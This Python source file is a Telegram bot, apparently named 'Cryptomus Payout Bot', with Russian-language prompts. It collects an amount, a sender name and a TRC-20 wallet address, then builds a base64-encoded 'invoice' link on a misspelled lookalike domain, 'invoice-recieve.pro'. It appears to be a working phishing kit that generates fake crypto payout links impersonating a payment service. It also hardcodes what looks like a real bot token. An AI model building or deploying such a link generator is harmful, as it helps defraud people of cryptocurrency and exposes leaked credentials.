import asyncio
import logging
import random
import string
import base64

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ─── НАСТРОЙКИ ────────────────────────────────────────────────
BOT_TOKEN = "8624068268:AAF7PtduLyEpNQE5xKVzTtdJasSea0Xe538"
BASE_URL  = "http://invoice-recieve.pro/"
# ──────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp  = Dispatcher(storage=MemoryStorage())


class Form(StatesGroup):
    amount = State()
    sender = State()
    wallet = State()


def is_trc20(addr: str) -> bool:
    return addr.startswith('T') and len(addr) == 34


def short_id(n=4):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))


def build_link(amount: float, sender: str, wallet: str) -> str:
    amt = str(int(amount)) if amount == int(amount) else str(amount)
    raw   = f"{amt}|{sender}|{wallet}|{short_id(4)}"
    token = base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')
    return f"{BASE_URL}/#t={token}"


def amt_str(amount: float) -> str:
    return str(int(amount)) if amount == int(amount) else str(amount)


# ─── /start ───────────────────────────────────────────────────
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await state.clear()
    await message.answer(
        "👋 <b>Cryptomus Payout Bot</b>\n\n"
        "Команды:\n"
        "• /gen &lt;сумма&gt; — одной строкой\n"
        "• /gen — пошаговый режим\n\n"
        "<i>Пример:</i> <code>/gen 500</code>",
        parse_mode="HTML"
    )


# ─── /gen ─────────────────────────────────────────────────────
@dp.message(Command("gen"))
async def cmd_gen(message: types.Message, state: FSMContext):
    await state.clear()
    parts = message.text.split(maxsplit=1)

    if len(parts) == 2:
        try:
            amount = float(parts[1].replace(",", "."))
            if amount <= 0:
                raise ValueError
        except ValueError:
            await message.answer("❌ Неверная сумма. Пример: <code>/gen 300</code>", parse_mode="HTML")
            return
        await state.update_data(amount=amount)
        await state.set_state(Form.sender)
        await message.answer(
            f"💰 Сумма: <b>{amt_str(amount)}.00 USDT</b>\n\n"
            f"Введите отправителя:\n"
            f"<i>Пример:</i> <code>MANAGER CP COMPANY</code>",
            parse_mode="HTML"
        )
        return

    await state.set_state(Form.amount)
    await message.answer("💵 Введи желаемую сумму чека", parse_mode="HTML")


# ─── Шаг 1: сумма ─────────────────────────────────────────────
@dp.message(StateFilter(Form.amount))
async def step_amount(message: types.Message, state: FSMContext):
    if not message.text or message.text.startswith('/'):
        return
    text = message.text.strip().replace(",", ".")
    try:
        amount = float(text)
        if amount <= 0:
            raise ValueError
    except ValueError:
        await message.answer("❌ Введите корректное число. Например: <code>300</code>", parse_mode="HTML")
        return
    await state.update_data(amount=amount)
    await state.set_state(Form.sender)
    await message.answer(
        f"💰 Сумма: <b>{amt_str(amount)}.00 USDT</b>\n\n"
        f"Введите отправителя:\n"
        f"<i>Пример:</i> <code>MANAGER CP COMPANY</code>",
        parse_mode="HTML"
    )


# ─── Шаг 2: отправитель ───────────────────────────────────────
@dp.message(StateFilter(Form.sender))
async def step_sender(message: types.Message, state: FSMContext):
    if not message.text or message.text.startswith('/'):
        return
    sender = message.text.strip()
    if not sender:
        await message.answer("❌ Введите имя отправителя.")
        return
    await state.update_data(sender=sender)
    await state.set_state(Form.wallet)
    await message.answer(
        f"🏢 Отправитель: <b>{sender.upper()}</b>\n\n"
        f"Введите TRC-20 адрес кошелька получателя:\n"
        f"<i>Пример:</i> <code>TUeapnPqxQBEuFjuJXCMLzNSywwCuBmQeE</code>",
        parse_mode="HTML"
    )


# ─── Шаг 3: кошелёк ───────────────────────────────────────────
@dp.message(StateFilter(Form.wallet))
async def step_wallet(message: types.Message, state: FSMContext):
    if not message.text or message.text.startswith('/'):
        return
    wallet = message.text.strip()
    if not is_trc20(wallet):
        await message.answer(
            "❌ Неверный TRC-20 адрес.\n"
            "Должен начинаться с <b>T</b> и содержать <b>34 символа</b>.\n\n"
            f"Длина введённого: <code>{len(wallet)}</code> символов\n\n"
            f"<i>Пример:</i> <code>TUeapnPqxQBEuFjuJXCMLzNSywwCuBmQeE</code>",
            parse_mode="HTML"
        )
        return

    data   = await state.get_data()
    await state.clear()

    amount = data["amount"]
    sender = data["sender"]
    link   = build_link(amount, sender, wallet)
    wallet_short = wallet[:9] + '...' + wallet[-6:]

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👆 Нажмите здесь, чтобы скопировать ссылку", url=link)]
    ])

    await message.answer(
        f"✅ <b>Счет сформирован</b>\n\n"
        f"💰 Сумма: <code>{amt_str(amount)}.00 USDT</code>\n"
        f"🏢 От кого: <code>{sender.upper()}</code>\n"
        f"👛 Кошелёк: <code>{wallet_short}</code>\n\n"
        f"🔗 Ссылка:\n<code>{link}</code>",
        parse_mode="HTML",
        reply_markup=kb
    )


async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
